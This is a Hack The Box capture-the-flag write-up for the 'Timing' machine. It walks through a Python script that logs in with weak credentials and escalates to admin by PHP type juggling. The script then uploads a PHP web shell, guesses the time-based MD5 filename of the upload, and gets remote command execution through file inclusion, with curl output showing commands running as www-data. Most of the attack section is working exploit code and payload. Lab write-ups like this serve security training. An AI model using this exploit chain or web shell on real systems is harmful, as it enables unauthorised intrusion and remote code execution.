# Hack The Box. Machines. Timing

Machine write-up: https://7rocky.github.io/en/htb/timing

### `upload.py`

The purpose of this script is to upload a PHP web shell. For that, we need to access with credentials `aaron:aaron`, modify its role to be `admin` (abusing Type Juggling) and then upload the file. Finally, we need to compute the filename using the same procedure that the server uses.

We start by creating a `requests` session (so that we don't need to care about cookies in subsequent requests), and declaring the name of the file to upload:

```python
    s = requests.session()
    filename = 'r.php.jpg'

    s.post('http://10.10.11.135/login.php?login=true', data={
        'user': 'aaron',
        'password': 'aaron'
    })
    print(f'Cookie: PHPSESSID={s.cookies["PHPSESSID"]}')
```

Then we need to change the user's role to be `1`, so that we can upload files. In the [write-up](https://7rocky.github.io/en/htb/timing) I show two ways of becoming `admin` (or role `1`). Here I will abuse Type Juggling:

```python
    s.post('http://10.10.11.135/profile_update.php?login.php', data={
        'firstName': 'x', 'lastName': 'x', 'email': 'x', 'company': 'x', 'role': '1'
    })
```

The server will receive role as `"1"`, and the check is `$_SESSION['role'] != 1` (PHP), so both values are the same (there is no type comparison).

Now we can upload the PHP web shell:

```python
    r = s.post('http://10.10.11.135/upload.php?login.php', files={
        'fileToUpload': (filename, b'<?php system($_GET["cmd"]); ?>')
    })
```

The server will perform some operations with the filename. It uses its relative time, adds a string `"$file_hash"` and then computes an MD5 hash. To get the current time relative to the server, we can use the `Date` header from the HTTP response and parse it to a time stamp.

As there can be some timing delays between request and response, I use some offset from below and above the time sent by the server and request the resulting file to see if I get 200 OK:

```python
    time = int(parser.parse(r.headers['Date']).timestamp())

    for i in range(-5, 5):
        test_file = f"{md5(b'$file_hash' + str(time + i).encode()).hexdigest()}_{filename}"

        if requests.get(f'http://10.10.11.135/images/uploads/{test_file}').status_code == 200:
            print('RCE:', f'http://10.10.11.135/images/uploads/{test_file}')
```

And that's it. Once the file is found, we can start using the web shell (exploiting a Local File Inclusion vulnerability that exists in the server) in the browser, using `curl` or whatever:

```console
$ python3 upload.py
Cookie: PHPSESSID=dg8sokd2ki84a93ggp2tttrlm6
RCE: http://10.10.11.135/images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg

$ curl 10.10.11.135/images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg  
<?php system($_GET["cmd"]); ?>

$ curl '10.10.11.135/image.php?img=images/uploads/67bcd57488a373e2873212f23c06c222_r.php.jpg&cmd=whoami'  
www-data
```
